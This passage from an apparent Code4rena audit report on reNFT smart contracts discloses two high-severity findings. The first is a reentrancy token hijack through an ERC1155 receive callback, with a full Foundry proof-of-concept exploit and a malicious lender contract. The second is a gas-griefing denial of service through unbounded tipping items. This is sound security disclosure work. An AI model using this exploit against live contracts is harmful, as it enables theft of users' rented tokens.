    - So calling `Storage.isRentedOut(attackerRentalSafe, APE_ERC1155, 5)` will return `100`, since that's the amount of APE ERC1155 tokens the attacker has borrowed so far.
    - Also calling `APE_ERC1155.balanceOf(attackerRentalSafe, 5)` will also return `100`, since that's the amount of APE ERC1155 tokens with ID 5 the attacker has in his rental safe
2. The attacker creates a malicious smart contract with a malicious `onERC1155Received` callback function (more on what it'll do later).
3. The attacker owns 100 APE ERC1155 (other than the ones borrowed, these are just ones he owned before borrowing), he will transfer them to the malicious smart contract he created.
4. The attacker creates a malicious `PAY` rental order (`BASE` also works), sets the offerer (lender) of the order to be the malicious smart contract, sets two offer items:      
    - 1st offer item would be `1x` APE ERC1155 tokens with ID 5.
    - 2nd offer item would be `99x` APE ERC1155 tokens with ID 5.
5. The attacker will fulfill that malicious order using his rental safe. So at this point, the lender would be the malicious attacker-controlled smart contract and the fulfiller would be the attacker's rental safe holding the 100 APE tokens borrowed from Alice.
6. The malicious rental will begin execution, the (1 + 99) APE tokens in the malicious smart contract will be transferred to the attacker's rental safe and the rental will be stored in the `Storage.sol`. At this point:
    - Calling `Storage.isRentedOut(attackerRentalSafe, APE_ERC1155, 5)` will return `200`, since that's the amount of APE ERC1155 tokens with ID 5 the attacker has borrowed so far (100 from Alice + 100 from himself).
    - Calling `APE_ERC1155.balanceOf(attackerRentalSafe, 5)` will also return `200`, since that's the amount of APE ERC1155 tokens with ID 5 the attacker has in his rental safe.
7. Now, the attacker will stop the malicious rental using [`Stop::stopRent()`](https://github.com/re-nft/smart-contracts/blob/97e5753e5398da65d3d26735e9d6439c757720f5/src/policies/Stop.sol#L263).
8. The rental termination process will begin execution. [`Stop::stopRent()`](https://github.com/re-nft/smart-contracts/blob/97e5753e5398da65d3d26735e9d6439c757720f5/src/policies/Stop.sol#L263) will do two main things:
    - Firstly, it will remove the malicious rental from storage using [`Storage::removeRentals()`](https://github.com/re-nft/smart-contracts/blob/97e5753e5398da65d3d26735e9d6439c757720f5/src/modules/Storage.sol#L247). After it does that, this will be the state:
        - Calling `Storage.isRentedOut(attackerRentalSafe, APE_ERC1155, 5)` will return `100`, since the malicious rental order was removed, so `rentedAssets[attackersRentalSafe_APE_ERC1155_ID5] -= 100` -> (200 - 100 = 100).
        - However, calling `APE_ERC1155.balanceOf(attackerRentalSafe, 5)` will return `200`, tokens are yet to be reclaimed (reclaimed meaning the tokens getting transferred back to the lender).
    - Secondly, it will begin the reclaiming process (transfer rental tokens from the renter back to the lender). It will call the internal function `Stop::_reclaimRentedItems()` and this internal function will end up calling the reclaiming function `Reclaimer::reclaimRentalOrder()` which will do the following:
        - It'll transfer the first rental token in the order back to the lender using `safeTransferFrom()`. The first rental token in the order would be `1x APE ERC1155 token with ID 5`, and the lender would be the malicious attacker-controlled smart contract.
        - Since `safeTransferFrom()` is utilized, the `onERC1155Received` callback function will be executed in the malicious smart contract (lender of malicious order).
        - In the `onERC1155Received` callback function, the malicious smart contract will instruct the gnosis safe to `transferFrom` 99x ERC1155 APE ID 5 tokens from itself to the attacker. The malicious smart contract can do this by calling `execTransaction`, feeding it with the `transferFrom` TX calldata and the pre-signed signature of that TX (created during the setting up of the malicious smart contract, check `setSignatureAndTransaction` function in PoC in the `MaliciousLender` smart contract).
        - Since it's a `transferFrom` TX to be executed, the guard will flag this and be invoked, the following code will be executed:

        ```solidity
                    } else if (selector == e1155_safe_transfer_from_selector) {
                        // Load the token ID from calldata.
                        uint256 tokenId = uint256(
                            _loadValueFromCalldata(data, e1155_safe_transfer_from_token_id_offset)
                        );

                        // Load the token amount from calldata
                        uint256 amountToRemove = uint256(
                            _loadValueFromCalldata(data, e1155_safe_transfer_from_amount_offset)
                        );

                        // Check if the amount leaving the safe is allowed.
                ---->   _revertSelectorOnValueOverflow(selector, from, to, tokenId, amountToRemove);
                    .......
        ```

        ```solidity
        
            ------> function _revertSelectorOnValueOverflow(
                        bytes4 selector,
                        address safe,
                        address token,
                        uint256 tokenId,
                        uint256 amountToRemove
                    ) private view {
                        // Get the total amount of currently rented assets.
                ----->  uint256 rentedAmount = STORE.isRentedOut(safe, token, tokenId);

                        // Token is not actively rented, so calculating whether the amount
                        // to remove is greater than the rented amount does not matter.
                        if (rentedAmount == 0) return;

                        // Amount of tokens that are currently in the safe.
                ----->  uint256 safeBalance = IERC1155(token).balanceOf(safe, tokenId);

                        // Amount that will be remaining in the safe.
                ----->  uint256 remainingBalance = safeBalance - amountToRemove;

                        // Check if the selector is allowed for the value provided.
                        if (rentedAmount > remainingBalance) {
                            revert Errors.GuardPolicy_UnauthorizedAssetAmount(
                                selector,
                                rentedAmount,
                                remainingBalance
                            );
                        }
                    }
        ```
        - The `STORE.isRentedOut(safe, token, tokenId)` call will return `100` as mentioned in point #8, therefore `rentedAmount` will be holding `100`.
        - The `IERC1155(token).balanceOf(safe, tokenId);` call will return `199` because we had `200` initially but 1x APE ERC1155 was transferred prior to the `onERC1155Received` function execution, so `200 - 1 = 199`, therefore, `remainingBalance` will be holding `199`.
        - The `amountToRemove` function parameter will be equal to `99`, since that's what we specified in the pre-signed `transferFrom` TX calldata.
        - The `remainingBalance` variable will be equal to (`199 - 99 = 100`).
        - The last If condition will be evaluted ("Is `rentedAmount = 100` > `remainingBalance = 100`"? If no -> continue execution flow).
        - The execution of the `onERC1155Received` function for the first rental item in the malicious rental order will end, now we will be back to `reclaimRentalOrder`'s loop.
        - `reclaimRentalOrder` will then transfer the second rental item in the malicious rental order which is `99x` APE ERC1155 ID 5 tokens, and no malicious `onERC1155Received` execution will be conducted this time. Also no guard will be invoked here, because guards aren't involved when it's a gnosis module conducting the token transfer in and out of the safe. In this case, it's the reclaiming module (using the transferrer library) actually conducting the `99x` APE ERC1155 token transfer.
        - At this point, the attacker will have 199x APE ERC1155 tokens, with only 1 APE ERC1155 token left in the rental safe, making the termination of the legitimate rental order offered by alice, an impossible mission. 
        - Tokens hijacked successfully!

Two notes:

1. This attack can be repeated endlessly to hijack all ERC1155 tokens in the rental safe. So even if the attacker has 1000 rented ERC1155 tokens but only owns 1 personal ERC1155, he can repeat the attack a 1000 times to hijack all the rented tokens and brick all rentals involving any sum of those 1000 rented tokens.
2. The malicious order can either involve 1 ERC721 token and X number of ERC1155 tokens to trigger `onERC721Receive` and execute the attack from there or it can involve 1x ERC1155 and X ERC1155 to trigger `onERC1155Receive` and execute the attack from there. The scenario and the coded PoC demonstrate the latter.

### Coded PoC

To run the PoC, you'll need to do the following:
1. You'll need to add this file to the `test/` folder:  
    - `Exploit.sol` -> File containing the PoC.
2. You'll need to run this command: `forge test --mt test_Hijack_Reentrancy -vv`.

**The file:**

<details>
<summary><b>Exploit.sol</b></summary>


    // SPDX-License-Identifier: BUSL-1.1
    pragma solidity ^0.8.20;

    import {
        Order,
        FulfillmentComponent,
        Fulfillment,
        ItemType as SeaportItemType,
        OfferItem,
        ItemType
    } from "@seaport-types/lib/ConsiderationStructs.sol";

    import {OfferItemLib} from "@seaport-sol/SeaportSol.sol";

    import {OrderType, OrderMetadata, RentalOrder} from "@src/libraries/RentalStructs.sol";

    import {ERC721} from '@openzeppelin-contracts/token/ERC721/ERC721.sol';
    import {IERC721} from '@openzeppelin-contracts/token/ERC721/IERC721.sol';
    import {Ownable} from "@openzeppelin-contracts/access/Ownable.sol";
    import {ERC1155} from '@openzeppelin-contracts/token/ERC1155/ERC1155.sol';

    import {BaseTest} from "@test/BaseTest.sol";
    import {Assertions} from "@test/utils/Assertions.sol";
    import {Constants} from "@test/utils/Constants.sol";
    import {SafeUtils} from "@test/utils/GnosisSafeUtils.sol";
    import {Enum} from "@safe-contracts/common/Enum.sol";

    import "forge-std/console.sol";



    contract Exploit is Assertions, Constants, BaseTest {

        using OfferItemLib for OfferItem;

        MaliciousLender maliciousLenderContract;

        function test_Hijack_Reentrancy() public {

            // bob    ==  attacker (borrower), also the owner of the malicious lender contract.
            // alice  ==  victim (lender)


            /** ------------ Deployment of essential contracts ------------ */

            // Deploy the malicious lender contract
            vm.prank(bob.addr);
            maliciousLenderContract = new MaliciousLender(); // Bob will be the owner of the malicious lender contract

            // A test ERC1155 token
            TestERC1155Token testERC1155Token = new TestERC1155Token();

            // A test ERC721 token
            TestERC721Token testERC721Token = new TestERC721Token();


            /** ------------ Approvals & Asset whitelist ------------ */

            // Add the test ERC721/1155 to the whitelist
            vm.startPrank(deployer.addr);
            admin.toggleWhitelistAsset(address(testERC1155Token), true);
            admin.toggleWhitelistAsset(address(testERC721Token), true);
            vm.stopPrank();

            // We will give alice (lender) 100 ERC1155 tokens to lend, and approve conduit
            testERC1155Token.mint(address(alice.addr), 1, 100, "");

            // We will give the malicious lender contract (bob) 100 ERC1155 tokens for the malicious rental
            testERC1155Token.mint(address(maliciousLenderContract), 1, 100, "");

            // We will give the malicious lender contract (bob) a dummy ERC721 token for the malicious rental
            testERC721Token.safeMint(address(maliciousLenderContract), 1);

            // Approve the conduit to spend alice's tokens
            vm.prank(address(alice.addr));
            testERC1155Token.setApprovalForAll(address(conduit), true);

            // Approve the conduit to spend bob's tokens
            vm.startPrank(address(maliciousLenderContract));
            testERC1155Token.setApprovalForAll(address(conduit), true);
            testERC721Token.setApprovalForAll(address(conduit), true);
            vm.stopPrank();


            /** ------------ Setting up the legitimate rental order ------------ */

            // We'll simulate a rental order where the attacker rents 100 ERC1155 tokens from Alice
            // Lender (victim)      ==   Alice
            // Borrower (attacker)  ==   Bob

            (
                RentalOrder memory legitimateRentalOrder, 
                bytes32 legitimateRentalOrderHash, 
                OrderMetadata memory legitimateRentalMetadata
            ) = setupLegitimateRental(address(testERC1155Token));

            // assert that the rental order was stored
            assertEq(STORE.orders(legitimateRentalOrderHash), true);

            // assert that 100 ERC1155 tokens exist in the borrower's safe (in this case, it's the attacker's safe)
            assertEq(STORE.isRentedOut(address(bob.safe), address(testERC1155Token), 1), 100);

            // assert that 100 ERC1155 tokens are in the rental wallet of the fulfiller
            assertEq(testERC1155Token.balanceOf(address(bob.safe), 1), 100);



            /** ------------ Setting up the malicious rental order ------------ */

            // The malicious rental is basically a self-rent. The lender is a smart contract made by the attacker and the borrower is the attacker's reNFT rental safe

            // Impersonate the attacker (owner of the malicious lender contract).
            vm.startPrank(bob.addr);

            // Set the attacker's (bob) safe address on the malicious lender contract which the malicious lender contract will communicate with.
            maliciousLenderContract.setSafeAddr(address(bob.safe));

            // Set the address of the token which the attacker wants to hijack on the malicious lender contract.
            maliciousLenderContract.setTokenToHijackAddr(address(testERC1155Token));

            vm.stopPrank();


            // Setup the malicious rental.
            // Lender    ==   the malicious lender contract (owned by bob, the attacker)
            // Borrower  ==   the attacker's rental safe (bob)

            (
                RentalOrder memory maliciousRentalOrder, 
                bytes32 maliciousRentalOrderHash, 
                OrderMetadata memory maliciousRentalMetadata
            ) = setupMaliciousRental(address(testERC1155Token));


            // assert that the rental order was stored
            assertEq(STORE.orders(maliciousRentalOrderHash), true);

            // assert that 200 ERC1155 tokens exist in the borrower's safe (in this case, it's the attacker's safe)
            assertEq(STORE.isRentedOut(address(bob.safe), address(testERC1155Token), 1), 200);

            // assert that the ERC1155 is in the rental wallet of the fulfiller (attacker)
            assertEq(testERC1155Token.balanceOf(address(bob.safe), 1), 200);


            /** ------------ Setting up the exploit ------------ */


            // ------------------- Prepare the pre-signed `transferFrom` malicious TX which the malicious lender will execute upon `onERC1155Received` callback function execution -------------------

            // The malicious TX which the malicious lender contract will execute when `onERC721Received` callback function is executed in it.
            bytes memory hijackTX = abi.encodeWithSignature(
                "safeTransferFrom(address,address,uint256,uint256,bytes)",
                address(bob.safe),
                address(bob.addr),
                1,
                99,
                ""
            );

            // Get the signature of the malicious TX.
            bytes memory transactionSignature = SafeUtils.signTransaction(
                address(bob.safe),
                bob.privateKey,
                address(testERC1155Token),
                hijackTX
            );

            // Set the malicious TX and it's signature on the malicious lender contract so that it sends it
            vm.prank(bob.addr);
            maliciousLenderContract.setSignatureAndTransaction(transactionSignature, hijackTX);

            // speed up in time past the rental expiration
            // Attacker can just construct a PAY order and terminate the rental at any time
            vm.warp(block.timestamp + 1000000);

            // Stop the malicious rental order
            vm.prank(address(maliciousLenderContract));
            stop.stopRent(maliciousRentalOrder);



            // ------------------ Proof of exploitation ------------------

            // At this point, bob will have only 1 ERC1155 token in his rental safe and 199 ERC1155 tokens in his EOA account.
            // This exploit can be used to empty the rental safe if repeated.
            // There is a 1 ERC1155 token leftover in the rental safe because we used 1 ERC1155 and 99 ERC1155 as offer items in the malicious order
            // If we want, we can use 1 ERC721 token and 100 ERC1155 tokens in the malicious order and leave 0 ERC1155 tokens in the attacker's rental safe

            uint256 bob_TestERC1155Token_Balance = testERC1155Token.balanceOf(address(bob.addr), 1); // 199
            uint256 bobsSafe_TestERC1155Token_Balance = testERC1155Token.balanceOf(address(bob.safe), 1); // 1

            if (bob_TestERC1155Token_Balance == 199 && bobsSafe_TestERC1155Token_Balance == 1) {
                console.log("ERC1155 Tokens hijacked successfully!");
            }

        }

        function setupLegitimateRental(address test_ERC1155_Token) public returns (RentalOrder memory, bytes32, OrderMetadata memory) {

            // create a BASE order
            createOrder({
                offerer: alice,
                orderType: OrderType.BASE,
                erc721Offers: 0,
                erc1155Offers: 1,
                erc20Offers: 0,
                erc721Considerations: 0,
                erc1155Considerations: 0,
                erc20Considerations: 1
            });

            // Remove the pre-inserted offer item (which is inserted by the tests)
            popOfferItem();

            // Set the test ERC1155 token which we created as the offer item
            withOfferItem(
                    OfferItemLib
                        .empty()
                        .withItemType(ItemType.ERC1155)
                        .withToken(address(test_ERC1155_Token))
                        .withIdentifierOrCriteria(1)
                        .withStartAmount(100)
                        .withEndAmount(100)
            );

            // Finalize the order creation
            (
                Order memory order,
                bytes32 orderHash,
                OrderMetadata memory metadata
            ) = finalizeOrder();
            

            // Create an order fulfillment
            createOrderFulfillment({
                _fulfiller: bob,
                order: order,
                orderHash: orderHash,
                metadata: metadata
            });

            // Finalize the base order fulfillment
            RentalOrder memory rentalOrder = finalizeBaseOrderFulfillment();

            // get the rental order hash
            bytes32 rentalOrderHash = create.getRentalOrderHash(rentalOrder);


            return (rentalOrder, rentalOrderHash, metadata);
            

        }


        function setupMaliciousRental(address test_ERC1155_Token) public returns (RentalOrder memory, bytes32, OrderMetadata memory) {

            // Cache bob's EOA address
            address bobsOriginalEOA_Address = bob.addr;

            // We're doing this because we're passing bob's `ProtocolAccount` struct to `createOrder()`
            // And we're doing so because we want to simulate the lender (bob) being a smart contract, not an EOA
            bob.addr = address(maliciousLenderContract);

            // create a BASE order
            createOrder({
                offerer: bob,
                orderType: OrderType.BASE,
                erc721Offers: 0,
                erc1155Offers: 2, // We'll lend ourselves 2 erc1155 tokens of the same kind & ID
                erc20Offers: 0,
                erc721Considerations: 0,
                erc1155Considerations: 0,
                erc20Considerations: 1
            });

            // Restore the correct address of the ProtocolAccount `bob` struct.
            bob.addr = bobsOriginalEOA_Address;

            // Remove the two pre-inserted offer items (which are inserted by the tests)
            popOfferItem();
            popOfferItem();

            // Lend ourselves 1 ERC1155 token.
            withOfferItem(
                    OfferItemLib
                        .empty()
                        .withItemType(ItemType.ERC1155)
                        .withToken(address(test_ERC1155_Token))
                        .withIdentifierOrCriteria(1)
                        .withStartAmount(1)
                        .withEndAmount(1)
            );

            // Lend ourselves 99 ERC1155 tokens on top of the 1 token.
            withOfferItem(
                    OfferItemLib
                        .empty()
                        .withItemType(ItemType.ERC1155)
                        .withToken(address(test_ERC1155_Token))
                        .withIdentifierOrCriteria(1)
                        .withStartAmount(99)
                        .withEndAmount(99)
            );

            // Finalize the order creation
            (
                Order memory order,
                bytes32 orderHash,
                OrderMetadata memory metadata
            ) = finalizeOrder();
            

            // Create an order fulfillment
            createOrderFulfillment({
                _fulfiller: bob,
                order: order,
                orderHash: orderHash,
                metadata: metadata
            });

            // Finalize the base order fulfillment
            RentalOrder memory rentalOrder = finalizeBaseOrderFulfillment();

            // get the rental order hash
            bytes32 rentalOrderHash = create.getRentalOrderHash(rentalOrder);

            return (rentalOrder, rentalOrderHash, metadata);
            

        }

    }









    // -------------------- Test ERC721/1155 tokens --------------------

    contract TestERC721Token is ERC721,  Ownable {

        constructor() ERC721("TestNFT", "TNFT") Ownable(msg.sender) {}

        function safeMint(address to, uint256 tokenId) public onlyOwner {
            _safeMint(to, tokenId);
        }

    }

    contract TestERC1155Token is ERC1155, Ownable {
        constructor() ERC1155("") Ownable(msg.sender) {}

        function mint(address account, uint256 id, uint256 amount, bytes memory data)
            public
            onlyOwner
        {
            _mint(account, id, amount, data);
        }

        function mintBatch(address to, uint256[] memory ids, uint256[] memory amounts, bytes memory data)
            public
            onlyOwner
        {
            _mintBatch(to, ids, amounts, data);
        }
    }


    interface IERC1155 {

        function balanceOfBatch(
            address[] calldata accounts,
            uint256[] calldata ids
        ) external view returns (uint256[] memory);

        function setApprovalForAll(address operator, bool approved) external;
        function safeTransferFrom(address from, address to, uint256 id, uint256 value, bytes memory data) external;
        function balanceOf(address account, uint256 id) external returns (uint256);

    }


    // -------------------- Malicious lender contract --------------------

    contract MaliciousLender {

        address private owner; // owner of the contract
        address private safe; // The address of the attacker's safe.
        address private tokenToHijack; // The address of the ERC1155 token which the attacker wants to hijack.

        bytes maliciousSafeTransactionSignature; // Signature needed for the Safe TX.
        bytes maliciousSafeTransaction; // The transaction sent to the attacker's safe which will hijack the token

        bool private lock;

        constructor() {
            owner = msg.sender;
        }

        function setSafeAddr(address _safe) external onlyOwner {
            safe = _safe;
        }

        function setTokenToHijackAddr(address _tokenAddr) external onlyOwner {
            tokenToHijack = _tokenAddr;
        }

        function setSignatureAndTransaction(bytes memory _signature, bytes memory _transaction) external onlyOwner {
            maliciousSafeTransactionSignature = _signature;
            maliciousSafeTransaction = _transaction;
        }

        function onERC721Received(address, address, uint256, bytes memory data) public virtual returns (bytes4) {
                
            return this.onERC721Received.selector;
        }

        function onERC1155Received(address, address from, uint256 id, uint256 amount, bytes memory) public virtual returns (bytes4) {
            
        // If == address(0), we don't want to trigger `_hijackERC1155Tokens`, because it'd be a mint in this case, not an actual transfer.
        if (from != address(0)) {

                // Redirect any ERC1155 tokens transferred to this contract to the owner of it (Bob)
                IERC1155(msg.sender).safeTransferFrom(
                    address(this), 
                    owner, 
                    id, 
                    IERC1155(msg.sender).balanceOf(address(this), id), 
                    ""
                );

                // On top of the previous condition, check if the variable `lock` is set to false, if yes execute the TX and set `lock` to true
                // We are doing the `lock` variable check because we only want `_hijackERC1155Tokens` to be executed once.
                if (lock == false) {
                    _hijackERC1155Tokens();
                    lock = true;
                }

        }

            return this.onERC1155Received.selector;
        }

        function onERC1155BatchReceived(address, address, uint256[] memory, uint256[] memory, bytes memory) public virtual returns (bytes4) {
            return this.onERC1155BatchReceived.selector;
        }

        // A helper function to split the signature 
        function splitSignature(bytes memory sig) public pure returns (uint8 v, bytes32 r, bytes32 s) {
            require(sig.length == 65);

            assembly {
                // first 32 bytes, after the length prefix.
                r := mload(add(sig, 32))
                // second 32 bytes.
                s := mload(add(sig, 64))
                // final byte (first byte of the next 32 bytes).
                v := byte(0, mload(add(sig, 96)))
            }

            return (v, r, s);
        }

        // EIP-1271 support. 
        // Since this is a smart contract and not an EOA fulfilling the order, this function will be called by seaport.
        function isValidSignature(bytes32 _hash, bytes memory _signature) external returns(bytes4) {
            (uint8 v, bytes32 r, bytes32 s) = splitSignature(_signature);
            address recoveredAddr = ecrecover(_hash, v, r, s);
            if (recoveredAddr == owner) {
                return 0x1626ba7e;
            } else {
                return 0x00000000;
            }
        }


        // A function utilized by the owner (the malicious lender) to be able to approve addresses to move tokens out of this contract. 
        // that address can be the conduit, it can be himself etc
        function approveAddrToSpendToken(address _token, address _addr) external onlyOwner {
            IERC1155(_token).setApprovalForAll(_addr, true);
        }


        function _hijackERC1155Tokens() internal returns(bool) {

            SafeUtils.executeTransaction(
                address(safe),
                address(tokenToHijack),
                maliciousSafeTransaction,
                maliciousSafeTransactionSignature
            );

            return true;

        }


        modifier onlyOwner {
            require(msg.sender == owner);
            _;
        }
    }

</details>

### Remediation

Two ways I can think of fixing this:
1. Would be to remove the rentals after the reclaiming process has finished (like how everything was pre-mitigations).
2. When `stopRent()` is executed, feed the reclaimer module the output of both `Store.isRentedOut(...)` and `ERC1155.balanceOf()` and add checks inside the `reclaimRentalOrder()` to state was somehow tampered with after each transfer, if something is malicious -> revert.

### Assessed type

Access Control

**[Alec1017 (reNFT) confirmed and commented](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/27#issuecomment-1979673284):**
> Agree that the best approach here is to remove the rentals from storage only after all processing has completed.

***

## [An attacker can hijack rentals indefinitely because no validation exists on the consideration item array size, allowing for DoS exploitation via the tipping feature](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/28)

*Submitted by [sin1st3r__](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/28), also found by [juancito](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/25).*

**Severity: High**

### Lines of code

https://github.com/re-nft/smart-contracts/blob/97e5753e5398da65d3d26735e9d6439c757720f5/src/policies/Create.sol#L334

### Pre-requisite knowledge and an overview of the features in question

**Seaport Tipping feature**: Seaport allows for "tipping" in the form of ERC20 tokens as part of the order fulfillment process. You, as a fulfiller, can tip ERC20 tokens to an order by extending the `consideration` array in the order with the additional ERC20 tokens you want to tip.

### Rental registeration and termination execution flow

1. To fulfill a renter and get it to be registered, one of the entry points to the application is the function [`fulfillAdvancedOrder`](https://github.com/re-nft/seaport-core/blob/cbe841804b69dee8e23882b3ae9efcbd4cbec31b/src/lib/Consideration.sol#L225) in Seaport. You run this function and feed it with order you would like to fulfill.
2. Once [`fulfillAdvancedOrder`](https://github.com/re-nft/seaport-core/blob/cbe841804b69dee8e23882b3ae9efcbd4cbec31b/src/lib/Consideration.sol#L225) is called, two things will happen: 
    1. First, the Seaport conduit (contract responsible for token transfers) will transfer both the `offer` and `consideration` items will be sent to the `Create` policy.
    2. Secondly, Seaport will call the zone associated with the order, which will be the [`Create`](https://github.com/re-nft/smart-contracts/blob/97e5753e5398da65d3d26735e9d6439c757720f5/src/policies/Create.sol#L47) policy, and the function [`Create::validateOrder`](https://github.com/re-nft/smart-contracts/blob/97e5753e5398da65d3d26735e9d6439c757720f5/src/policies/Create.sol#L819) will be called. From there, the rental registeration begins.
3. [`Create::validateOrder`](https://github.com/re-nft/smart-contracts/blob/97e5753e5398da65d3d26735e9d6439c757720f5/src/policies/Create.sol#L819) will verify the calldata supplied to [`Create::validateOrder`](https://github.com/re-nft/smart-contracts/blob/97e5753e5398da65d3d26735e9d6439c757720f5/src/policies/Create.sol#L819) to ensure it has not been tampered with in a malicious way and then it will call the internal function [`Create::_rentFromZone`](https://github.com/re-nft/smart-contracts/blob/97e5753e5398da65d3d26735e9d6439c757720f5/src/policies/Create.sol#L573) which will begin the actual rental registeration process.
4. [`Create::_rentFromZone`](https://github.com/re-nft/smart-contracts/blob/97e5753e5398da65d3d26735e9d6439c757720f5/src/policies/Create.sol#L573) will begin it's execution by executing a couple of checks like (ensure the order type is `FULL_RESTRICED`, `_isValidSeaportOrderType`) and then it will check if the order is of `BASE` or `PAY` type. We're concerned with `BASE` type, so let's see how would that work.
5. After determining that the order is a `BASE` order, it will register the rental in the [`Storage.sol`](https://github.com/re-nft/smart-contracts/blob/main/src/modules/Storage.sol) contract which holds most of the state of the protocol, it will transfer all the ERC20 consideration items to the payment escrow and it will transfer all the ERC721 and ERC1155 tokens to the rental safe of the fulfiller. Hooks will also be added, if the lender specified any.
6. The rental order will start.
7. `BASE` orders can't be terminated prior to it's expiration date. If it's expiration date has passed, then anybody can stop the rental, be it the lender or the borrower.
8. Once the order expires, the lender will terminate it's execution by calling [`Stop:stopRent()`](https://github.com/re-nft/smart-contracts/blob/97e5753e5398da65d3d26735e9d6439c757720f5/src/policies/Stop.sol#L263) function and supplying it with the `RentalOrder` struct of the order to terminate.
9. When the [`Stop:stopRent()`](https://github.com/re-nft/smart-contracts/blob/97e5753e5398da65d3d26735e9d6439c757720f5/src/policies/Stop.sol#L263) execution begins, it'll first validate if the rental can be stopped (ie. expired or not), then it'll remove the rental order state from the [`Storage.sol`](https://github.com/re-nft/smart-contracts/blob/main/src/modules/Storage.sol) contract by calling the function [`Storage::removeRentals()`](https://github.com/re-nft/smart-contracts/blob/97e5753e5398da65d3d26735e9d6439c757720f5/src/modules/Storage.sol#L247) and supplying it with the rental order details. Then it'll begin the settlement process.
10. The settlement process will begin. [`Storage::removeRentals()`](https://github.com/re-nft/smart-contracts/blob/97e5753e5398da65d3d26735e9d6439c757720f5/src/modules/Storage.sol#L247) will iterate through all the rented ERC721/1155 items in the order and transfer each token from the borrower's rental safe back to the lender through the function [`Stop::_reclaimRentedItems()`](https://github.com/re-nft/smart-contracts/blob/97e5753e5398da65d3d26735e9d6439c757720f5/src/policies/Stop.sol#L356), and then the payment settlement process will begin executing by calling the [`PaymentEscrow::settlePayment()`](https://github.com/re-nft/smart-contracts/blob/97e5753e5398da65d3d26735e9d6439c757720f5/src/modules/PaymentEscrow.sol#L295). The consideration ERC20 tokens associated with the order which were held in the Payment Escrow will then be released and sent to the lender.

### The Vulnerability

Looking at the function [`_convertToItems`](https://github.com/re-nft/smart-contracts/blob/97e5753e5398da65d3d26735e9d6439c757720f5/src/policies/Create.sol#L456) in [`Create.sol`](https://github.com/re-nft/smart-contracts/blob/main/src/policies/Create.sol):

```solidity

    function _convertToItems(
        SpentItem[] memory offers,
        ReceivedItem[] memory considerations,
        OrderType orderType
    ) internal pure returns (Item[] memory items) {
        // Initialize an array of items.
        items = new Item[](offers.length + considerations.length);

        // Process items for a base order.
        if (orderType.isBaseOrder()) {
            // Process offer items.
            _processBaseOrderOffer(items, offers, 0);

            // Process consideration items.
            _processBaseOrderConsideration(items, considerations, offers.length);
        }
        ...........
```

And looking at the function [`_processBaseOrderOffer`](https://github.com/re-nft/smart-contracts/blob/97e5753e5398da65d3d26735e9d6439c757720f5/src/policies/Create.sol#L203) in [`Create.sol`](https://github.com/re-nft/smart-contracts/blob/main/src/policies/Create.sol):

```solidity

    function _processBaseOrderConsideration(
        Item[] memory rentalItems,
        ReceivedItem[] memory considerations,
        uint256 startIndex
    ) internal pure {
        // Must be at least one consideration item.
        if (considerations.length == 0) {
            revert Errors.CreatePolicy_ConsiderationCountZero();
        }

        // Process each consideration item.
        for (uint256 i; i < considerations.length; ++i) {
            // Get the consideration item.
            ReceivedItem memory consideration = considerations[i];

            // Only process an ERC20 item.
            if (!consideration.isERC20()) {
                revert Errors.CreatePolicy_SeaportItemTypeNotSupported(
                    consideration.itemType
                );
            }

            // An ERC20 consideration item is considered a payment to the lender upon
            // expiration of the rental order.
            rentalItems[i + startIndex] = Item({
                itemType: ItemType.ERC20,
                settleTo: SettleTo.LENDER,
                token: consideration.token,
                amount: consideration.amount,
                identifier: consideration.identifier
            });
        }
    }
```

It is evident that there is no check if the consideration array size is bigger than a defined threshold, essentially it can be of unlimited size. This allows an attacker to tip thousands of `1 wei` worth of ERC20 tokens, pay a hefty sum of money in gas and get to keep the tokens he rented as long as the lender does not pay ~50% of what the attacker has paid in gas, in order to stop the rental.

### Rental creation & termination: Gas analysis

Rental creation ([`Create::validateOrder`](https://github.com/re-nft/smart-contracts/blob/97e5753e5398da65d3d26735e9d6439c757720f5/src/policies/Create.sol#L819)) is on average 2.20x as expensive as rental termination ([`Stop::stopRent()`](https://github.com/re-nft/smart-contracts/blob/97e5753e5398da65d3d26735e9d6439c757720f5/src/policies/Stop.sol#L263)) gas wise. 

Let's take an example of an order with 1 offer item and 5000 consideration items.

In foundry tests, this order will cost `334,152,383` gas during rental creation, and it will cost `153,426,081` gas to terminate it.

Add the following file to your `tests/` folder and run the following command `forge test --mt test_analyzeGasUsage -vv`:

<details>
<summary><b>GasAnalysis.sol</b></summary>


    // SPDX-License-Identifier: BUSL-1.1
    pragma solidity ^0.8.20;

    import {
        Order,
        FulfillmentComponent,
        Fulfillment,
        ItemType as SeaportItemType,
        CriteriaResolver,
        AdvancedOrder,
        OfferItem,
        ConsiderationItem,
        OrderComponents,
        OrderType as SeaportOrderType,
        OrderParameters,
        ItemType
    } from "@seaport-types/lib/ConsiderationStructs.sol";

    import {
        ZoneParameters
    } from "@seaport-core/lib/rental/ConsiderationStructs.sol";

    import {
        OfferItemLib,
        OrderComponentsLib,
        ConsiderationItemLib,
        OrderLib
    } from "@seaport-sol/SeaportSol.sol";

    import {Seaport} from "@seaport-core/Seaport.sol";
    import {ZoneInterface} from "@src/interfaces/IZone.sol";
    import {Zone} from "@src/packages/Zone.sol";
    import {TokenReceiver} from "@src/packages/TokenReceiver.sol";
    import {Errors} from "@src/libraries/Errors.sol";
    import {ISafe} from "@src/interfaces/ISafe.sol";

    import {OrderType, OrderMetadata, RentalOrder} from "@src/libraries/RentalStructs.sol";
    import {Events} from "@src/libraries/Events.sol";
    import {ECDSA} from "@openzeppelin-contracts/utils/cryptography/ECDSA.sol";

    import {ERC721} from '@openzeppelin-contracts/token/ERC721/ERC721.sol';
    import {IERC721} from '@openzeppelin-contracts/token/ERC721/IERC721.sol';
    import {Ownable} from "@openzeppelin-contracts/access/Ownable.sol";
    import {ERC1155} from '@openzeppelin-contracts/token/ERC1155/ERC1155.sol';
    import {IERC1155} from '@openzeppelin-contracts/interfaces/IERC1155.sol';
    import {IERC20} from '@openzeppelin-contracts/interfaces/IERC20.sol';

    import {ProtocolAccount} from "@test/utils/Types.sol";
    import {BaseTest} from "@test/BaseTest.sol";
    import {Assertions} from "@test/utils/Assertions.sol";
    import {Constants} from "@test/utils/Constants.sol";
    import {SafeUtils} from "@test/utils/GnosisSafeUtils.sol";
    import {Enum} from "@safe-contracts/common/Enum.sol";

